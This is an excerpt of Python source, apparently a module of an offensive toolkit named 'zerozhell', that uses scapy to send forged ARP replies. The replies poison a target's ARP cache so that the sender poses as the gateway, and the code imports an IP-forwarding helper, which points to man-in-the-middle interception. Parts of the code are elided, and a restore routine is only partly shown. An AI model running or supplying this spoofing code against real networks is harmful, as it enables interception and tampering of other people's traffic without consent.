...
from zerozhell.core.utils import get_mac, enable_ip_forward
...
class Main(base.Module):
    ...
    def _spoof(self, target, getway):
        ...
        arp_response = scapy.ARP(pdst=target, hwdst=target_mac, psrc=getway, op='is-at')
        # get the MAC address
        self_mac = scapy.ARP().hwsrc
        # send the packet
        send(arp_response)
        print(f"Sent to {target} : {getway} MAC {self_mac}")


    def _restore(self, target, getway):
        print(f"Stoping arp spoofing ...")
        target_mac = get_mac(ip=target)
        arp_response = scapy.ARP(pdst=target, hwdst=target_mac, psrc=getway, op='is-at')
